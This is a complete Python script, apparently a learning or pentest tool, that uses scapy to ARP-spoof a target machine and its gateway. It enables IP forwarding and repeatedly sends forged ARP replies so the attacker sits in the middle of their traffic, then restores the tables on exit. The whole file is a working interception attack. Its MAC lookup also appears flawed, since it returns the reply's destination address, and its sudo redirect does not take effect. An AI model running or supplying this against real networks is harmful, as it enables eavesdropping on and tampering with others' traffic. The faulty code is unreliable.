#! /bin/python3

import subprocess
import time
from argparse import ArgumentParser

import scapy.all as scapy


def parse_arguments():
    """Parse command-line arguments."""
    parser = ArgumentParser(prog="ARP spoofer")
    parser.add_argument(
        "-t",
        "--target",
        nargs=1,
        dest="target_ip",
        required=True,
        help="the IP address of the target machine",
    )
    parser.add_argument(
        "-g",
        "--gateway",
        nargs=1,
        dest="gateway_ip",
        required=True,
        help="the IP address of the default gateway",
    )
    return parser.parse_args()


def get_mac(target_ip):
    """Get MAC address of a given IP address."""
    # (Wikipedia) in an arp request, the hwdst field is ignored;
    # therefore, we need to create an Ether layer to carry the broadcast link-layer address
    arp_request = scapy.ARP(pdst=target_ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = ether / arp_request

    # srp returns 2 lists
    # the first one contains pairs of request-response
    # the second one contains requests that are not responded

    # this function gets MAC address of one specific internet address;
    # therefore, there is only 1 answer in the response
    answer = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    if answer:
        # get the response from the first and the only pair from the answer list
        return answer[0][1].hwdst
    else:
        return None


def restore(dest_ip, src_ip):
    """
    Restore the ARP table of the machine at dest_ip.
    The MAC address of the src_ip in the ARP table will be updated accordingly.
    """
    # Get MAC addresses of the corresponding ip addresses for further uses
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)

    # If a given ip address does not exist in the same LAN, raise exception;
    if dest_mac is None:
        raise Exception(f"No machine at {dest_ip} was found!")
    elif src_mac is None:
        raise Exception(f"No machine at {src_ip} was found!")
    # otherwise, send an ARP response to the dest machine to make it update its arp table
    else:
        packet = scapy.ARP(
            op=2, psrc=src_ip, hwsrc=src_mac, pdst=dest_ip, hwdst=dest_mac
        )

        scapy.send(packet, verbose=False)


def spoof(target_ip, spoofed_ip):
    """Spoof the machine having the target_ip as we are the spoofed_ip."""
    hwdst = get_mac(target_ip)
    if hwdst is None:
        raise Exception(f"No target at {target_ip} was found!")
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hwdst, psrc=spoofed_ip)

    scapy.send(packet, verbose=False)


if __name__ == "__main__":
    # Enable packet forwarding
    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

    args = parse_arguments()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip

    try:
        while True:
            try:
                # Spoof the target and the gateway
                # As a result, we become the man in the middle!

                # Spoof the target that we are the gateway
                spoof(target_ip, gateway_ip)
                # Spoof the gateway that we are the target
                spoof(gateway_ip, target_ip)

                print(
                    f"\r[+] Spoofed {gateway_ip} and {target_ip} successfully!", end=""
                )
                time.sleep(2)
            except Exception as target_exception:
                print(target_exception)
                break
    except KeyboardInterrupt:
        print("\n[+] Resetting ARP tables...")
        for _ in range(3):
            # Restore ARP tables of the target and the gateway
            # Consequently, we are no longer the man in the middle :<
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            time.sleep(1)

        # Disable packet forwarding
        subprocess.call("sudo echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print("[+] Quitting...")
